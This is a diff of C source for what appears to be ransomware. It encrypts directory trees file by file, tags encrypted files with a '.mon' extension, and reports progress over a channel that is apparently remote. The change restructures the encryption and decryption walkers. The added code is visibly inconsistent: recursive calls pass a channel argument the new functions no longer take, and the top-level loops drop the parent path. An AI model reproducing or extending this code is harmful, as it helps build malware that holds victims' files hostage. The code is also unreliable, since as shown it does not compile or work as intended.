@@ -33,14 +33,14 @@
 
 char *extension = ".mon";
 
-int begin_encrypt(int channel, char *path, char *key, char *iv)
+static int recursive_encrypt(char *path, char *key, char *iv)
 {
     DIR *fd = opendir(path);
 
     if (fd == NULL)
         return -1;
 
-    char *name, *target, *process;
+    char *name, *target;
     FILE *resource, *result;
 
     struct dirent *dir;
@@ -52,7 +52,7 @@ int begin_encrypt(int channel, char *path, char *key, char *iv)
 
             target = link_string(path, dir->d_name, 1);
 
-            if (begin_encrypt(channel, target, key, iv) < 0) {
+            if (recursive_encrypt(channel, target, key, iv) < 0) {
                 resource = fopen(target, "rb");
 
                 if (resource != NULL) {
@@ -68,12 +68,6 @@ int begin_encrypt(int channel, char *path, char *key, char *iv)
                     fclose(resource);
                     free(name);
                 }
-            } else {
-                process = link_string("Encrypting ", target, 0);
-                process = link_string(process, "\n", 0);
-
-                send_channel(channel, process);
-                free(process);
             }
 
             free(target);
@@ -84,14 +78,14 @@ int begin_encrypt(int channel, char *path, char *key, char *iv)
     return 0;
 }
 
-int begin_decrypt(int channel, char *path, char *key, char *iv)
+static int recursive_decrypt(char *path, char *key, char *iv)
 {
     DIR *fd = opendir(path);
 
     if (fd == NULL)
         return -1;
 
-    char *name, *target, *process;
+    char *name, *target;
     FILE *resource, *result;
 
     struct dirent *dir;
@@ -102,7 +96,7 @@ int begin_decrypt(int channel, char *path, char *key, char *iv)
 
             target = link_string(path, dir->d_name, 1);
 
-            if (begin_decrypt(channel, target, key, iv) < 0) {
+            if (recursive_decrypt(channel, target, key, iv) < 0) {
                 resource = fopen(target, "rb");
 
                 if (resource != NULL) {
@@ -118,15 +112,64 @@ int begin_decrypt(int channel, char *path, char *key, char *iv)
                     fclose(resource);
                     free(name);
                 }
-            } else {
-                process = link_string("Decrypting ", target, 0);
-                process = link_string(process, "\n", 0);
-
-                send_channel(channel, process);
-                free(process);
             }
 
             free(target);
+        }
+    }
+
+    closedir(fd);
+    return 0;
+}
+
+int begin_encrypt(int channel, char *path, char *key, char *iv)
+{
+    DIR *fd = opendir(path);
+
+    if (fd == NULL)
+        return -1;
+
+    char *name;
+    struct dirent *dir;
+
+    while ((dir = readdir(fd)) != NULL) {
+        if (strcmp(dir->d_name, ".") != 0 &&
+            strcmp(dir->d_name, "..") != 0 &&
+            strstr(dir->d_name, extension) == NULL) {
+
+            name = link_string("Encrypting ", dir->d_name, 0);
+            name = link_string(name, "\n", 0);
+            send_channel(channel, name);
+
+            recursive_encrypt(dir->d_name, key, iv);
+            free(name);
+        }
+    }
+
+    closedir(fd);
+    return 0;
+}
+
+int begin_decrypt(int channel, char *path, char *key, char *iv)
+{
+    DIR *fd = opendir(path);
+
+    if (fd == NULL)
+        return -1;
+
+    char *name;
+    struct dirent *dir;
+
+    while ((dir = readdir(fd)) != NULL) {
+        if (strcmp(dir->d_name, ".") != 0 &&
+            strcmp(dir->d_name, "..") != 0) {
+
+            name = link_string("Decrypting ", dir->d_name, 0);
+            name = link_string(name, "\n", 0);
+            send_channel(channel, name);
+
+            recursive_decrypt(dir->d_name, key, iv);
+            free(name);
         }
     }
 
